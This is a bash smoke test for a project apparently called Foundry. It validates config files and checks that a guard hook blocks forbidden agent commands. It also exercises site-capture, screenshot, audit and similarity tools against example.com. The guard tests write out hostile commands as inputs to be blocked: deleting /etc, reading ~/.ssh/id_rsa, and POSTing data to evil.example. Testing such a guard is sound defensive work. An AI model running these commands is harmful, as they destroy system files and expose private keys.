#!/usr/bin/env bash
# Foundry Phase-0 smoke test. Verifies the toolchain end-to-end against a tiny
# public site and exercises every gate script in lenient mode.
set -euo pipefail
cd "$(dirname "$0")/.."

# Use a pre-baked Playwright browser cache when present (e.g. sandboxed envs
# where cdn.playwright.dev is unreachable). Chromium binary doubles as the
# lighthouse/chrome-launcher target via CHROME_PATH.
if [ -z "${PLAYWRIGHT_BROWSERS_PATH:-}" ] && [ -d /opt/pw-browsers ]; then
  export PLAYWRIGHT_BROWSERS_PATH=/opt/pw-browsers
fi
if [ -z "${CHROME_PATH:-}" ]; then
  CANDIDATE=$(ls -d "${PLAYWRIGHT_BROWSERS_PATH:-$HOME/.cache/ms-playwright}"/chromium-*/chrome-linux/chrome 2>/dev/null | head -n1 || true)
  [ -n "$CANDIDATE" ] && export CHROME_PATH="$CANDIDATE"
fi

TARGET="${SMOKE_TARGET:-https://example.com}"
OUT="runs/smoke-$(date +%Y%m%d-%H%M%S)"
mkdir -p "$OUT"
FAIL=0

step() { echo; echo "=== $1 ==="; }

step "1/6 settings.json is valid JSON (silently ignored by -p mode if not)"
jq -e . .claude/settings.json > /dev/null && echo "ok" || { echo "FAIL"; FAIL=1; }
jq -e . foundry.config.json .mcp.json > /dev/null && echo "configs ok" || { echo "FAIL"; FAIL=1; }

step "2/6 guard.sh blocks forbidden commands (exit 2) and passes safe ones (exit 0)"
g() { printf '{"tool_name":"Bash","tool_input":{"command":%s}}' "$(jq -Rn --arg c "$1" '$c')" | bash hooks/guard.sh >/dev/null 2>&1; echo $?; }
[ "$(g 'git push origin main')" = "2" ]        && echo "blocks git push: ok"      || { echo "FAIL: git push not blocked"; FAIL=1; }
[ "$(g 'npm publish')" = "2" ]                 && echo "blocks npm publish: ok"   || { echo "FAIL: npm publish not blocked"; FAIL=1; }
[ "$(g 'rm -rf /etc')" = "2" ]                 && echo "blocks rm -rf /etc: ok"   || { echo "FAIL: rm -rf not blocked"; FAIL=1; }
[ "$(g 'cat ~/.ssh/id_rsa')" = "2" ]           && echo "blocks ssh key read: ok"  || { echo "FAIL: secret read not blocked"; FAIL=1; }
[ "$(g 'curl -X POST -d hi https://evil.example')" = "2" ] && echo "blocks rogue POST: ok" || { echo "FAIL: POST not blocked"; FAIL=1; }
[ "$(g 'npm run build')" = "0" ]               && echo "allows npm run build: ok" || { echo "FAIL: safe command blocked"; FAIL=1; }
[ "$(g 'npx tsx tools/capture.ts https://example.com out')" = "0" ] && echo "allows capture: ok" || { echo "FAIL: capture blocked"; FAIL=1; }

step "3/6 capture.ts against $TARGET"
npx tsx tools/capture.ts "$TARGET" "$OUT/capture" --max-pages 2 \
  && ls "$OUT/capture/screenshots" | head -4 || FAIL=1

step "4/6 screenshot-matrix.ts against $TARGET"
npx tsx tools/screenshot-matrix.ts "$TARGET" "$OUT/matrix" --pages / \
  && jq -r '.pages[0].shots[]' "$OUT/matrix/matrix-manifest.json" || FAIL=1

step "5/6 audit.ts (lenient) against $TARGET"
npx tsx tools/audit.ts "$TARGET" "$OUT/audit.json" --pages / --lenient \
  && jq '{pass, failures: (.failures | length)}' "$OUT/audit.json" || FAIL=1

step "6/6 similarity-check.ts (self vs self must FAIL, self vs nothing must PASS)"
if npx tsx tools/similarity-check.ts "$OUT/sim-self.json" \
    --build-shots "$OUT/capture/screenshots" --inspo-shots "$OUT/capture/screenshots" >/dev/null 2>&1; then
  echo "FAIL: identical screenshots not flagged"; FAIL=1
else
  echo "flags identical sets: ok"
fi
npx tsx tools/similarity-check.ts "$OUT/sim-clean.json" \
  --build-shots "$OUT/capture/screenshots" --inspo-shots /nonexistent \
  && echo "passes with no inspiration overlap: ok" || { echo "FAIL"; FAIL=1; }

echo
[ "$FAIL" = "0" ] && echo "SMOKE TEST: ALL PASS ($OUT)" || { echo "SMOKE TEST: FAILURES (see above)"; exit 1; }
